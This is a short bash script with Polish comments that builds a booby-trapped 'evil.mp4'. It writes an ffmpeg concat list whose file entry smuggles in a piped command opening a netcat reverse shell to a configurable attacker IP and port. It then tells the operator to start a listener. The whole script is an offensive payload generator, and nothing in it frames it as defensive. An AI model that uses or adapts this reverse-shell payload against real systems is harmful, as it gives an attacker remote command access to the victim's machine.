#!/bin/bash

# === KONFIGURACJA ===
ATTACKER_IP="192.168.1.100"     # ← Zamień na swój IP
ATTACKER_PORT="4444"            # ← Zamień na swój port NetCat

# === PLIK LISTY ===
echo "[*] Tworzenie list.txt..."
echo "file '/dev/null'" > list.txt
echo "file '|/bin/bash -c \"nc $ATTACKER_IP $ATTACKER_PORT -e /bin/sh\"'" >> list.txt

# === GENEROWANIE MP4 ===
echo "[*] Generowanie złośliwego evil.mp4..."
ffmpeg -f concat -safe 0 -i list.txt -c copy evil.mp4

# === PODSUMOWANIE ===
if [[ -f "evil.mp4" ]]; then
    echo "[+] Gotowe! Plik 'evil.mp4' utworzony."
    echo "[!] Upewnij się, że nasłuchujesz: nc -lvnp $ATTACKER_PORT"
else
    echo "[!] Coś poszło nie tak – nie utworzono pliku evil.mp4."
fi
